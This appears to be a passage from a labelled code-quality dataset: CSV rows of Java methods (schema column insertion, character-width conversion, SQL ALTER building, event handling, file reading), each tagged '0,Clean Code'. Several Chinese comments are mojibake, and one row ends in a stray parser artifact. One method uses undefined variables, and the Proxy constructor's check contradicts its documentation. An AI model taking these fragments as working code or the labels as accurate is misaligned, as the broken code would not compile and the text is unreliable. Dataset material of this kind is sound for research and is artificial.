  for (  AddColumnEvent.ColumnWithPosition columnWithPosition : event.getAddedColumns()) {
switch (columnWithPosition.getPosition()) {
case FIRST:
{
        columns.addFirst(columnWithPosition.getAddColumn());
        break;
      }
case LAST:
{
      columns.addLast(columnWithPosition.getAddColumn());
      break;
    }
case BEFORE:
{
    Preconditions.checkNotNull(columnWithPosition.getExistedColumnName(),""existedColumnName could not be null in BEFORE type AddColumnEvent"");
    List<String> columnNames=columns.stream().map(Column::getName).collect(Collectors.toList());
    int index=columnNames.indexOf(columnWithPosition.getExistedColumnName());
    if (index < 0) {
      throw new IllegalArgumentException(columnWithPosition.getExistedColumnName() + "" of AddColumnEvent is not existed"");
    }
    columns.add(index,columnWithPosition.getAddColumn());
    break;
  }
case AFTER:
{
  Preconditions.checkNotNull(columnWithPosition.getExistedColumnName(),""existedColumnName could not be null in AFTER type AddColumnEvent"");
  List<String> columnNames=columns.stream().map(Column::getName).collect(Collectors.toList());
  int index=columnNames.indexOf(columnWithPosition.getExistedColumnName());
  if (index < 0) {
    throw new IllegalArgumentException(columnWithPosition.getExistedColumnName() + "" of AddColumnEvent is not existed"");
  }
  columns.add(index + 1,columnWithPosition.getAddColumn());
  break;
}
}
}
return oldSchema.copy(columns);
}",0,Clean Code
"/** 
 * 鍏ㄨ杞崐瑙�
 * @param input String.
 * @return 鍗婅瀛楃涓�
 */
public static String toDBC(String input){
  return toDBC(input,null);
}
/** 
 * 鏇挎崲鍏ㄨ涓哄崐瑙�
 * @param text          鏂囨湰
 * @param notConvertSet 涓嶆浛鎹㈢殑瀛楃闆嗗悎
 * @return 鏇挎崲鍚庣殑瀛楃
 */
public static String toDBC(String text,Set<Character> notConvertSet){
  char[] c=text.toCharArray();
  for (int i=0; i < c.length; i++) {
    if (null != notConvertSet && notConvertSet.contains(c[i])) {
      continue;
    }
    if (c[i] == '\u3000') {
      c[i]=' ';
    }
 else     if (c[i] > '\uFF00' && c[i] < '\uFF5F') {
      c[i]=(char)(c[i] - 65248);
    }
  }
  String returnString=new String(c);
  return returnString;
}",0,Clean Code
"@Override public String buildModifyTaleSql(Table oldTable,Table newTable){
  StringBuilder script=new StringBuilder();
  if (!StringUtils.equalsIgnoreCase(oldTable.getName(),newTable.getName())) {
    script.append(""ALTER TABLE "").append(""\"""").append(oldTable.getSchemaName()).append(""\"".\"""").append(oldTable.getName()).append(""\"""");
    script.append("" "").append(""RENAME TO "").append(""\"""").append(newTable.getName()).append(""\"""").append("";\n"");
  }
  if (!StringUtils.equalsIgnoreCase(oldTable.getComment(),newTable.getComment())) {
    script.append("""").append(buildTableComment(newTable)).append("";\n"");
  }
  for (  TableColumn tableColumn : newTable.getColumnList()) {
    if (StringUtils.isNotBlank(tableColumn.getEditStatus())) {
      OracleColumnTypeEnum typeEnum=OracleColumnTypeEnum.getByType(tableColumn.getColumnType());
      script.append(""\t"").append(typeEnum.buildModifyColumn(tableColumn)).append("";\n"");
      if (StringUtils.isNotBlank(tableColumn.getComment())) {
        script.append(""\n"").append(buildComment(tableColumn)).append("";\n"");
      }
    }
  }
  for (  TableIndex tableIndex : newTable.getIndexList()) {
    if (StringUtils.isNotBlank(tableIndex.getEditStatus()) && StringUtils.isNotBlank(tableIndex.getType())) {
      OracleIndexTypeEnum mysqlIndexTypeEnum=OracleIndexTypeEnum.getByType(tableIndex.getType());
      script.append(""\t"").append(mysqlIndexTypeEnum.buildModifyIndex(tableIndex)).append("";\n"");
    }
  }
  if (script.length() > 2) {
    script=new StringBuilder(script.substring(0,script.length() - 2));
    script.append("";"");
  }
  return script.toString();
}",0,Clean Code
"/** 
 * get fast chat message
 * @param uid
 * @param prompt
 * @return
 */
private List<FastChatMessage> getFastChatMessage(String uid,String prompt){
  List<FastChatMessage> messages=(List<FastChatMessage>)LocalCache.CACHE.get(uid);
  if (CollectionUtils.isNotEmpty(messages)) {
    if (messages.size() >= contextLength) {
      messages=messages.subList(1,contextLength);
    }
  }
 else {
    messages=Lists.newArrayList();
  }
  FastChatMessage currentMessage=new FastChatMessage(FastChatRole.USER).setContent(prompt);
  messages.add(currentMessage);
  return messages;
}",0,Clean Code
"/** 
 * 灏嗘楠よВ鏋愭垚 MsTestElement 鏍戠粨鏋�
 */
private void parseStep2MsElement(AbstractMsTestElement parentElement,List<? extends ApiScenarioStepCommonDTO> steps,ApiScenarioParseTmpParam parseParam,String scenarioId){
  if (CollectionUtils.isNotEmpty(steps)) {
    parentElement.setChildren(new LinkedList<>());
  }
  Map<String,String> stepDetailMap=parseParam.getStepDetailMap();
  Map<String,String> resourceDetailMap=parseParam.getResourceDetailMap();
  Map<String,List<MsHTTPElement>> stepTypeHttpElementMap=parseParam.getStepTypeHttpElementMap();
  for (  ApiScenarioStepCommonDTO step : steps) {
    StepParser stepParser=StepParserFactory.getStepParser(step.getStepType());
    if (BooleanUtils.isFalse(step.getEnable())) {
      continue;
    }
    setPartialRefStepEnable(step,stepDetailMap);
    if (isRequestStep(step) && BooleanUtils.isTrue(step.getEnable())) {
      parseParam.getRequestCount().getAndIncrement();
    }
    if (StringUtils.isBlank(step.getUniqueId())) {
      step.setUniqueId(IDGenerator.nextStr());
    }
    parseParam.getUniqueIdStepMap().put(step.getUniqueId(),step);
    AbstractMsTestElement msTestElement=stepParser.parseTestElement(step,MapUtils.isNotEmpty(resourceDetailMap) ? resourceDetailMap.getOrDefault(step.getResourceId(),StringUtils.EMPTY) : StringUtils.EMPTY,stepDetailMap.get(step.getId()));
    if (msTestElement != null) {
      if (msTestElement instanceof MsHTTPElement) {
        stepTypeHttpElementMap.putIfAbsent(step.getStepType(),new LinkedList<>());
        stepTypeHttpElementMap.get(step.getStepType()).add(msHTTPElement);
      }
 else       if (msTestElement instanceof MsScriptElement) {
        parseParam.getScriptElements().add(msScriptElement);
      }
      msTestElement.setProjectId(step.getProjectId());
      msTestElement.setResourceId(step.getResourceId());
      msTestElement.setName(step.getName());
      msTestElement.setStepId(step.getUniqueId());
      msTestElement.setCsvIds(step.getCsvIds());
      parseParam.getRefProjectIds().add(step.getProjectId());
      if (isRefOrPartialRef(step.getRefType())) {
        parseParam.getFileResourceIds().add(step.getResourceId());
      }
 else       if (msTestElement instanceof MsHTTPElement) {
        parseParam.getFileResourceIds().add(step.getId());
        parseParam.getFileStepScenarioMap().put(step.getId(),scenarioId);
      }
      setMsScenarioParam(parseParam.getScenarioParseEnvInfo(),step,msTestElement);
      Optional.ofNullable(apiCommonService.getMsCommonElement(msTestElement)).ifPresent(msCommonElement -> parseParam.getCommonElements().add(msCommonElement));
      parentElement.getChildren().add(msTestElement);
      if (CollectionUtils.isNotEmpty(step.getChildren())) {
        if (isScenarioStep(step.getStepType()) && isRefOrPartialRef(step.getRefType())) {
          scenarioId=step.getResourceId();
        }
        parseStep2MsElement(msTestElement,step.getChildren(),parseParam,scenarioId);
      }
    }
  }
}",0,Clean Code
"@Override public void onEvent(EventSource eventSource,String id,String type,String dataString){
  if (logResponses) {
    LOGGER.debug(""onEvent() type: '{}', data: {}"",type,dataString);
  }
  try {
    AnthropicStreamingData data=OBJECT_MAPPER.readValue(dataString,AnthropicStreamingData.class);
    if (""message_start"".equals(type)) {
      handleMessageStart(data);
    }
 else     if (""content_block_start"".equals(type)) {
      handleContentBlockStart(data);
    }
 else     if (""content_block_delta"".equals(type)) {
      handleContentBlockDelta(data);
    }
 else     if (""content_block_stop"".equals(type)) {
      handleContentBlockStop();
    }
 else     if (""message_delta"".equals(type)) {
      handleMessageDelta(data);
    }
 else     if (""message_stop"".equals(type)) {
      handleMessageStop();
    }
 else     if (""error"".equals(type)) {
      handleError(dataString);
    }
  }
 catch (  Exception e) {
    handler.onError(e);
  }
}
",0,Clean Code
"private Proxy(){
  type=Type.DIRECT;
  sa=null;
}
/** 
 * Creates an entry representing a PROXY connection. Certain combinations are illegal. For instance, for types Http, and Socks, a SocketAddress <b>must</b> be provided. <P> Use the  {@code Proxy.NO_PROXY} constantfor representing a direct connection.
 * @param type the {@code Type} of the proxy
 * @param sa the {@code SocketAddress} for that proxy
 * @throws IllegalArgumentException when the type and the address areincompatible
 */
public Proxy(Type type,SocketAddress sa){
  if ((type == Type.DIRECT) || !(sa instanceof PasswdInetSocketAddress))   throw new IllegalArgumentException(""type "" + type + "" is not compatible with address ""+ sa);
  this.type=type;
  this.sa=sa;
}
",0,Clean Code
"/** 
 * See  {@link #equals(Object)}. 
 */
@SuppressWarnings(""NonOverridingEquals"") public boolean equals(final CAddress address){
  return (address != null) && (this.address == address.address);
}
/** 
 * See  {@link #equals(Object)}. 
 */
@SuppressWarnings(""NonOverridingEquals"") public boolean equals(final IAddress address){
  return (address != null) && (this.address == address.toLong());
}
/** 
 * See  {@link #equals(Object)}. 
 */
@SuppressWarnings(""NonOverridingEquals"") public boolean equals(final long address){
  return this.address == address;
}
@Override public boolean equals(final Object address){
  return (address instanceof IAddress) && (this.address == ((IAddress)address).toLong());
}
",0,Clean Code
"private void parseLocationMetadata(MetadataLocalProperties metadataLocalProperties,List<InstanceMetadataProvider> instanceMetadataProviders){
  if (!CollectionUtils.isEmpty(instanceMetadataProviders)) {
    Set<String> providerRegions=instanceMetadataProviders.stream().map(InstanceMetadataProvider::getRegion).filter(region -> !StringUtils.isBlank(region)).collect(Collectors.toSet());
    if (!CollectionUtils.isEmpty(providerRegions)) {
      if (providerRegions.size() > 1) {
        throw new IllegalArgumentException(""Multiple Regions Provided in InstanceMetadataProviders"");
      }
      region=providerRegions.iterator().next();
    }
  }
  if (StringUtils.isBlank(region)) {
    region=System.getenv(ENV_METADATA_REGION);
  }
  if (StringUtils.isBlank(region)) {
    region=metadataLocalProperties.getContent().get(LOCATION_KEY_REGION);
  }
  if (!CollectionUtils.isEmpty(instanceMetadataProviders)) {
    Set<String> providerZones=instanceMetadataProviders.stream().map(InstanceMetadataProvider::getZone).filter(zone -> !StringUtils.isBlank(zone)).collect(Collectors.toSet());
    if (!CollectionUtils.isEmpty(providerZones)) {
      if (providerZones.size() > 1) {
        throw new IllegalArgumentException(""Multiple Zones Provided in InstanceMetadataProviders"");
      }
      zone=providerZones.iterator().next();
    }
  }
  if (StringUtils.isBlank(zone)) {
    zone=System.getenv(ENV_METADATA_ZONE);
  }
  if (StringUtils.isBlank(zone)) {
    zone=metadataLocalProperties.getContent().get(LOCATION_KEY_ZONE);
  }
  if (!CollectionUtils.isEmpty(instanceMetadataProviders)) {
    Set<String> providerCampus=instanceMetadataProviders.stream().map(InstanceMetadataProvider::getCampus).filter(campus -> !StringUtils.isBlank(campus)).collect(Collectors.toSet());
    if (!CollectionUtils.isEmpty(providerCampus)) {
      if (providerCampus.size() > 1) {
        throw new IllegalArgumentException(""Multiple Campus Provided in InstanceMetadataProviders"");
      }
      campus=providerCampus.iterator().next();
    }
  }
  if (StringUtils.isBlank(campus)) {
    campus=System.getenv(ENV_METADATA_CAMPUS);
  }
  if (StringUtils.isBlank(campus)) {
    campus=metadataLocalProperties.getContent().get(LOCATION_KEY_CAMPUS);
  }
}",0,Clean Code
"/** 
 * Returns the version of a specified instance of a feature, or  {@link #VERSION_UNSET} if noversion is set.
 * @param database The database to query.
 * @param feature The feature.
 * @param instanceUid The unique identifier of the instance of the feature.
 * @return The version, or {@link #VERSION_UNSET} if no version is set.
 * @throws DatabaseIOException If an error occurs executing the SQL.
 */
public static int getVersion(SQLiteDatabase database,@Feature int feature,String instanceUid) throws DatabaseIOException {
  try {
    if (!tableExists(database,TABLE_NAME)) {
      return VERSION_UNSET;
    }
    try (Cursor cursor=database.query(TABLE_NAME,new String[]{COLUMN_VERSION},WHERE_FEATURE_AND_INSTANCE_UID_EQUALS,featureAndInstanceUidArguments(feature,instanceUid),null,null,null)){
      if (cursor.getCount() == 0) {
        return VERSION_UNSET;
      }
      cursor.moveToNext();
      return cursor.getInt(0);
    }
   }
 catch (  SQLException e) {
    throw new DatabaseIOException(e);
  }
}",0,Clean Code
"/** 
 * Returns a string representation of the given array. This method takes an Object to allow also all types of primitive type arrays.
 * @param array The array to create a string representation for.
 * @return The string representation of the array.
 * @throws IllegalArgumentException If the given object is no array.
 */
public static String arrayToString(Object array){
  if (array == null) {
    throw new NullPointerException();
  }
  if (array instanceof int[]) {
    return Arrays.toString((int[])array);
  }
  if (array instanceof long[]) {
    return Arrays.toString((long[])array);
  }
  if (array instanceof Object[]) {
    return Arrays.toString((Object[])array);
  }
  if (array instanceof byte[]) {
    return Arrays.toString((byte[])array);
  }
  if (array instanceof double[]) {
    return Arrays.toString((double[])array);
  }
  if (array instanceof float[]) {
    return Arrays.toString((float[])array);
  }
  if (array instanceof boolean[]) {
    return Arrays.toString((boolean[])array);
  }
  if (array instanceof char[]) {
    return Arrays.toString((char[])array);
  }
  if (array instanceof short[]) {
    return Arrays.toString((short[])array);
  }
  if (array.getClass().isArray()) {
    return ""<unknown array type>"";
  }
 else {
    throw new IllegalArgumentException(""The given argument is no array."");
  }
}
",0,Clean Code
"private void displayAddress(){
  Hwi.DisplayAddressService displayAddressService=new Hwi.DisplayAddressService(device,passphrase.get(),wallet.getScriptType(),outputDescriptor);
  displayAddressService.setOnSucceeded(successEvent -> {
    String address=displayAddressService.getValue();
    EventManager.get().post(new AddressDisplayedEvent(address));
  }
);
  displayAddressService.setOnFailed(failedEvent -> {
    setError(""Could not display address"",displayAddressService.getException().getMessage());
    displayAddressButton.setDisable(false);
  }
);
  setDescription(""Check device for address"");
  displayAddressService.start();
}
",0,Clean Code
"@Override protected boolean performAction(final View host,final ItemInfo item,int action,boolean fromKeyboard){
  if (action == ACTION_LONG_CLICK) {
    PreDragCondition dragCondition=null;
    if (host instanceof BubbleTextView) {
      dragCondition=((BubbleTextView)host).startLongPressAction();
    }
 else     if (host instanceof BubbleTextHolder) {
      BubbleTextHolder holder=(BubbleTextHolder)host;
      dragCondition=holder.getBubbleText() == null ? null : holder.getBubbleText().startLongPressAction();
    }
    return dragCondition != null;
  }
 else   if (action == MOVE) {
    return beginAccessibleDrag(host,item,fromKeyboard);
  }
 else   if (action == ADD_TO_WORKSPACE) {
    return addToWorkspace(item,true);
  }
 else   if (action == MOVE_TO_WORKSPACE) {
    return moveToWorkspace(item);
  }
 else   if (action == RESIZE) {
    final LauncherAppWidgetInfo info=(LauncherAppWidgetInfo)item;
    List<OptionItem> actions=getSupportedResizeActions(host,info);
    Rect pos=new Rect();
    mContext.getDragLayer().getDescendantRectRelativeToSelf(host,pos);
    ArrowPopup popup=OptionsPopupView.show(mContext,new RectF(pos),actions,false);
    popup.requestFocus();
    popup.addOnCloseCallback(() -> {
      host.requestFocus();
      host.sendAccessibilityEvent(TYPE_VIEW_FOCUSED);
      host.performAccessibilityAction(ACTION_ACCESSIBILITY_FOCUS,null);
    }
);
    return true;
  }
 else   if (action == DEEP_SHORTCUTS || action == SHORTCUTS_AND_NOTIFICATIONS) {
    BubbleTextView btv=host instanceof BubbleTextView ? (BubbleTextView)host : (host instanceof BubbleTextHolder ? ((BubbleTextHolder)host).getBubbleText() : null);
    return btv != null && PopupContainerWithArrow.showForIcon(btv) != null;
  }
 else {
    for (    ButtonDropTarget dropTarget : mContext.getDropTargetBar().getDropTargets()) {
      if (dropTarget.supportsAccessibilityDrop(item,host) && action == dropTarget.getAccessibilityAction()) {
        dropTarget.onAccessibilityDrop(host,item);
        return true;
      }
    }
  }
  return false;
}
",0,Clean Code
"public PopupKeySpec(@NonNull final String popupKeySpec,boolean needsToUpperCase,@NonNull final Locale locale){
  if (popupKeySpec.isEmpty()) {
    throw new KeySpecParser.KeySpecParserError(""Empty popup key spec"");
  }
  final String label=KeySpecParser.getLabel(popupKeySpec);
  mLabel=needsToUpperCase ? StringUtils.toTitleCaseOfKeyLabel(label,locale) : label;
  final int codeInSpec=KeySpecParser.getCode(popupKeySpec);
  final int code=needsToUpperCase ? StringUtils.toTitleCaseOfKeyCode(codeInSpec,locale) : codeInSpec;
  if (code == KeyCode.NOT_SPECIFIED) {
    mCode=KeyCode.MULTIPLE_CODE_POINTS;
    mOutputText=mLabel;
  }
 else {
    mCode=code;
    final String outputText=KeySpecParser.getOutputText(popupKeySpec);
    mOutputText=needsToUpperCase ? StringUtils.toTitleCaseOfKeyLabel(outputText,locale) : outputText;
  }
  mIconName=KeySpecParser.getIconName(popupKeySpec);
}
",0,Clean Code
"private AppPackageDOExample buildExample(AppPackageQueryCondition condition){
  AppPackageDOExample example=new AppPackageDOExample();
  AppPackageDOExample.Criteria criteria=example.createCriteria();
  if (condition.getId() != null && condition.getId() > 0) {
    criteria.andIdEqualTo(condition.getId());
  }
  if (StringUtils.isNotBlank(condition.getAppId())) {
    criteria.andAppIdEqualTo(condition.getAppId());
  }
  if (StringUtils.isNotBlank(condition.getPackageCreator())) {
    criteria.andPackageCreatorEqualTo(condition.getPackageCreator());
  }
  if (StringUtils.isNotBlank(condition.getPackageVersion())) {
    criteria.andPackageVersionEqualTo(condition.getPackageVersion());
  }
  if (StringUtils.isNotBlank(condition.getPackageVersionGreaterThan())) {
    criteria.andPackageVersionGreaterThan(condition.getPackageVersionGreaterThan());
  }
  if (StringUtils.isNotBlank(condition.getPackageVersionLessThan())) {
    criteria.andPackageVersionLessThan(condition.getPackageVersionLessThan());
  }
  if (StringUtils.isNotBlank(condition.getNamespaceId())) {
    criteria.andNamespaceIdEqualTo(condition.getNamespaceId());
  }
  if (StringUtils.isNotBlank(condition.getStageId())) {
    criteria.andStageIdEqualTo(condition.getStageId());
  }
  return example;
}",0,Clean Code
"/** 
 * Returns an ad playback state with the specified number of ads in each of the specified ad groups, each ten seconds long.
 * @param adsPerAdGroup The number of ads per ad group.
 * @param adGroupTimesUs The times of ad groups, in microseconds.
 * @return The ad playback state.
 */
public static AdPlaybackState createAdPlaybackState(int adsPerAdGroup,long... adGroupTimesUs){
  int adGroupCount=adGroupTimesUs.length;
  AdPlaybackState adPlaybackState=new AdPlaybackState(adGroupTimesUs);
  long[][] adDurationsUs=new long[adGroupCount][];
  for (int i=0; i < adGroupCount; i++) {
    adPlaybackState=adPlaybackState.withAdCount(i,adsPerAdGroup);
    adDurationsUs[i]=new long[adsPerAdGroup];
    Arrays.fill(adDurationsUs[i],AD_DURATION_US);
  }
  adPlaybackState=adPlaybackState.withAdDurationsUs(adDurationsUs);
  return adPlaybackState;
}",0,Clean Code
"private void createSymlink(Path lockFile){
  Path pointer=getUserLockFilePointer();
  try {
    if (pointer != null && !Files.exists(pointer,LinkOption.NOFOLLOW_LINKS)) {
      Files.createSymbolicLink(pointer,lockFile);
      pointer.toFile().deleteOnExit();
    }
  }
 catch (  IOException e) {
    log.debug(""Could not create symlink "" + pointer.toAbsolutePath() + "" to lockFile at ""+ lockFile.toAbsolutePath()+ "", writing as normal file"",e);
    try {
      Files.writeString(pointer,lockFile.toAbsolutePath().toString(),StandardCharsets.UTF_8);
      pointer.toFile().deleteOnExit();
    }
 catch (    IOException ex) {
      log.warn(""Could not create pointer "" + pointer.toAbsolutePath() + "" to lockFile at ""+ lockFile.toAbsolutePath(),ex);
    }
  }
catch (  Exception e) {
  }
}",0,Clean Code
"protected Reference addClassInfoHolderField(Class<?> cls){
  String key;
  if (ReflectionUtils.isMonomorphic(cls)) {
    key=""classInfoHolder:"" + cls;
  }
 else {
    key=""classInfoHolder:"" + cls + walkPath;
  }
  Reference reference=(Reference)sharedFieldMap.get(key);
  if (reference != null) {
    return reference;
  }
  Expression classInfoHolderExpr=inlineInvoke(classResolverRef,""nilClassInfoHolder"",classInfoHolderTypeRef);
  String name=ctx.newName(cls,""ClassInfoHolder"");
  ctx.addField(true,ctx.type(ClassInfoHolder.class),name,classInfoHolderExpr);
  reference=new Reference(name,classInfoHolderTypeRef);
  sharedFieldMap.put(key,reference);
  return reference;
}
",0,Clean Code
"/** 
 * 浜у搧鎴愪氦鍛ㄦ湡鍥�
 * @param biParams params
 * @return data
 */
@Override public JSONObject productCycle(BiParams biParams){
  Integer menuId=104;
  biParams.setMenuId(menuId);
  BiTimeUtil.BiTimeEntity record=BiTimeUtil.analyzeType(biParams);
  List<Long> userIds=record.getUserIds();
  List<SimpleCrmEntity> productList=ApplicationContextHolder.getBean(CrmService.class).queryProductInfo().getData();
  if (userIds.size() == 0 || productList.size() == 0) {
    return new JSONObject().fluentPut(""list"",new ArrayList<>()).fluentPut(""total"",new JSONObject());
  }
  List<JSONObject> recordList=biCustomerMapper.productCycle(record,productList);
  JSONObject total=new JSONObject().fluentPut(""productName"",""鎬昏"").fluentPut(""customerNum"",0).fluentPut(""cycle"",0);
  recordList.forEach(r -> {
    total.put(""customerNum"",total.getInteger(""customerNum"") + r.getInteger(""customerNum""));
    total.put(""cycle"",total.getInteger(""cycle"") + r.getInteger(""cycle""));
  }
);
  return new JSONObject().fluentPut(""list"",recordList).fluentPut(""total"",total);
}",0,Clean Code
"private void showCopyPopup(String urlFinal){
  if (parentActivity == null) {
    return;
  }
  if (linkSheet != null) {
    linkSheet.dismiss();
    linkSheet=null;
  }
  BottomBuilder builder=new BottomBuilder(parentActivity);
  String formattedUrl=urlFinal;
  try {
    formattedUrl=URLDecoder.decode(urlFinal.replaceAll(""\\+"",""%2b""),""UTF-8"");
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  builder.addTitle(formattedUrl);
  builder.setTitleMultipleLines(true);
  builder.addItems(new String[]{LocaleController.getString(""Open"",R.string.Open),LocaleController.getString(""Copy"",R.string.Copy),LocaleController.getString(""ShareQRCode"",R.string.ShareQRCode)},new int[]{R.drawable.msg_openin,R.drawable.msg_copy,R.drawable.msg_qrcode},(which,text,cell) -> {
    if (parentActivity == null)     return Unit.INSTANCE;
    if (which == 0 || which == 2) {
      int index;
      if ((index=urlFinal.lastIndexOf('#')) != -1) {
        String webPageUrl;
        if (!TextUtils.isEmpty(adapter[0].currentPage.cached_page.url)) {
          webPageUrl=adapter[0].currentPage.cached_page.url.toLowerCase();
        }
 else {
          webPageUrl=adapter[0].currentPage.url.toLowerCase();
        }
        String anchor;
        try {
          anchor=URLDecoder.decode(urlFinal.substring(index + 1),""UTF-8"");
        }
 catch (        Exception ignore) {
          anchor="""";
        }
        if (urlFinal.toLowerCase().contains(webPageUrl)) {
          if (TextUtils.isEmpty(anchor)) {
            layoutManager[0].scrollToPositionWithOffset(0,0);
            checkScrollAnimated();
          }
 else {
            scrollToAnchor(anchor);
          }
          return Unit.INSTANCE;
        }
      }
      if (which == 0) {
        Browser.openUrl(parentActivity,urlFinal);
      }
 else {
        ProxyUtil.showQrDialog(parentActivity,urlFinal);
      }
    }
 else     if (which == 1) {
      String url=urlFinal;
      if (url.startsWith(""mailto:"")) {
        url=url.substring(7);
      }
 else       if (url.startsWith(""tel:"")) {
        url=url.substring(4);
      }
      AndroidUtilities.addToClipboard(url);
      AlertUtil.showToast(LocaleController.getString(""LinkCopied"",R.string.LinkCopied));
    }
    return Unit.INSTANCE;
  }
);
  builder.setOnPreDismissListener(di -> links.clear());
  BottomSheet sheet=builder.create();
  showDialog(sheet);
}",0,Clean Code
"@Override public CfAuthExample getExampleByQuery(CfAuthQuery cfAuthQuery){
  CfAuthExample cfAuthExample=new CfAuthExample();
  CfAuthExample.Criteria criteria=cfAuthExample.createCriteria();
  if (cfAuthQuery.getIds() != null && cfAuthQuery.getIds().size() > 0) {
    criteria.andIdIn(cfAuthQuery.getIds());
  }
  if (cfAuthQuery.getLevel() != null) {
    criteria.andLevelEqualTo(cfAuthQuery.getLevel());
  }
  if (StringUtils.isNotEmpty(cfAuthQuery.getPath())) {
    criteria.andPathEqualTo(cfAuthQuery.getPath());
  }
  if (StringUtils.isNotEmpty(cfAuthQuery.getModule())) {
    criteria.andModuleEqualTo(cfAuthQuery.getModule());
  }
  if (StringUtils.isNotEmpty(cfAuthQuery.getController())) {
    criteria.andControllerEqualTo(cfAuthQuery.getController());
  }
  if (cfAuthQuery.getBreadcrumbHidden() != null) {
    criteria.andBreadcrumbHiddenEqualTo(cfAuthQuery.getBreadcrumbHidden());
  }
  if (cfAuthQuery.getShowMenu() != null) {
    criteria.andShowMenuEqualTo(cfAuthQuery.getShowMenu());
  }
  if (StringUtils.isNotEmpty(cfAuthQuery.getOrderBy())) {
    cfAuthExample.setOrderByClause(cfAuthQuery.getOrderBy());
  }
  if (cfAuthQuery.getPage() != null && cfAuthQuery.getSize() != null) {
    PageHelper.startPage(cfAuthQuery.getPage(),cfAuthQuery.getSize());
  }
  return cfAuthExample;
}",0,Clean Code
"private static void encodeText(StringBuilder stringBuilder,String text,Collection<Character> delimiters,Character escapeChar,Character quoteChar){
  for (int i=0; i < text.length(); ++i) {
    char ch=text.charAt(i);
    if (delimiters.contains(ch)) {
      if (escapeChar != null) {
        stringBuilder.append(escapeChar);
        stringBuilder.append(ch);
      }
 else       if (quoteChar != null) {
        stringBuilder.append(quoteChar);
        stringBuilder.append(ch);
        stringBuilder.append(quoteChar);
      }
 else {
        throw new IllegalArgumentException(""There is a delimiter "" + ""in the text, but neither escape nor quote character "" + ""is specified."");
      }
    }
 else     if (escapeChar != null && ch == escapeChar) {
      stringBuilder.append(escapeChar);
      stringBuilder.append(ch);
    }
 else     if (quoteChar != null && ch == quoteChar) {
      if (escapeChar != null) {
        stringBuilder.append(escapeChar);
        stringBuilder.append(ch);
      }
 else {
        throw new IllegalArgumentException(""There is a quote "" + ""character in the text, but escape character is not "" + ""specified."");
      }
    }
 else {
      stringBuilder.append(ch);
    }
  }
}",0,Clean Code
"private static String readTextFile(List<String> filePaths){
  if (filePaths == null || filePaths.isEmpty()) {
    return null;
  }
  Log.v(TAG,""all file path : "" + filePaths.toString());
  StringBuilder content=new StringBuilder();
  for (  String filePath : filePaths) {
    if (!TextUtils.isEmpty(filePath)) {
      content=new StringBuilder();
      File file=new File(filePath);
      if (file.isFile()) {
        Log.v(TAG,""available filePath: "" + filePath);
        if (file.isFile()) {
          InputStream inputStream=null;
          InputStreamReader streamReader=null;
          BufferedReader buffreader=null;
          try {
            inputStream=new FileInputStream(file);
            streamReader=new InputStreamReader(inputStream);
            buffreader=new BufferedReader(streamReader);
            String line;
            while ((line=buffreader.readLine()) != null) {
              content.append(line);
              content.append(""\n"");
            }
            if (!TextUtils.isEmpty(content)) {
              break;
            }
          }
 catch (          java.io.FileNotFoundException e) {
            Log.d(TAG,""The File doesn't not exist."");
          }
catch (          IOException e) {
            Log.d(TAG,e.getMessage());
          }
 finally {
            try {
              if (inputStream != null) {
                inputStream.close();
              }
              if (streamReader != null) {
                streamReader.close();
              }
              if (buffreader != null) {
                buffreader.close();
              }
            }
 catch (            IOException ignore) {
            }
          }
        }
      }
    }
  }
  return content.toString();
}
",0,Clean Code
"public static Set<String> getClassSet(String packageName){
  Set<String> classSet=new HashSet<>();
  try {
    Enumeration<URL> urls=loader.getResources(packageName.replace(""."",""/""));
    while (urls.hasMoreElements()) {
      URL url=urls.nextElement();
      if (url != null) {
        String protocol=url.getProtocol();
        if (protocol.equals(""jar"")) {
          JarURLConnection jarURLConnection=(JarURLConnection)url.openConnection();
          if (jarURLConnection != null) {
            JarFile jarFile=jarURLConnection.getJarFile();
            if (jarFile != null) {
              Enumeration<JarEntry> jarEntries=jarFile.entries();
              while (jarEntries.hasMoreElements()) {
                JarEntry jarEntry=jarEntries.nextElement();
                String jarEntryName=jarEntry.getName();
                if (jarEntryName.endsWith("".class"")) {
                  String className=jarEntryName.substring(0,jarEntryName.lastIndexOf(""."")).replaceAll(""/"",""."");
                  if (!className.contains(""$"") && className.startsWith(packageName)) {
                    classSet.add(className);
                  }
                }
              }
            }
          }
        }
      }
    }
  }
 catch (  Exception ignored) {
  }
  return classSet;
}",0,Clean Code
"private DatasetDataProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private DatasetDataProto(){
  transformProvenance_=java.util.Collections.emptyList();
  tribuoVersion_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@a0f9720",0,Clean Code
"@GetMapping(""intcompare"") public void intcompare(){
  Integer a=127;
  Integer b=127;
  log.info(""\nInteger a = 127;\n"" + ""Integer b = 127;\n"" + ""a == b ? {}"",a == b);
  Integer c=128;
  Integer d=128;
  log.info(""\nInteger c = 128;\n"" + ""Integer d = 128;\n"" + ""c == d ? {}"",c == d);
  Integer e=127;
  Integer f=new Integer(127);
  log.info(""\nInteger e = 127;\n"" + ""Integer f = new Integer(127);\n"" + ""e == f ? {}"",e == f);
  Integer g=new Integer(127);
  Integer h=new Integer(127);
  log.info(""\nInteger g = new Integer(127);\n"" + ""Integer h = new Integer(127);\n"" + ""g == h ? {}"",g == h);
  Integer i=128;
  int j=128;
  log.info(""\nInteger i = 128;\n"" + ""int j = 128;\n"" + ""i == j ? {}"",i == j);
}",0,Clean Code
"/** 
 * 鏄惁鍛戒腑闇瑕侀噰鏍
 * @param patterns patterns
 * @param className className
 * @param methodName methodName
 * @return {@link boolean}
 */
private boolean matchRequestUriAndSample(List<JavaRecordInterface> patterns,String className,String methodName){
  if (!MoonboxContext.getInstance().isStartEnd()) {
    return false;
  }
  if (CollectionUtils.isEmpty(patterns)) {
    return false;
  }
  for (  JavaRecordInterface pattern : patterns) {
    if (!StringUtils.equals(className,pattern.getClassPattern()) || null == pattern.getMethodPatterns()) {
      continue;
    }
    if (Arrays.stream(pattern.getMethodPatterns()).anyMatch(i -> StringUtils.equals(i,methodName))) {
      int random=UriSampleRateRandomUtils.getRandom(pattern.getUniqueKey()).nextInt(10000);
      if (random < Integer.parseInt(pattern.getSampleRate())) {
        if (!MoonboxRecordIndicatorManager.getInstance().canRecord(pattern.getUniqueKey())) {
          ContextResourceClear.sampleFalse();
          return false;
        }
        log.info(""sampled className:{} methodName={}"",className,methodName);
        return true;
      }
    }
  }
  return false;
}",0,Clean Code
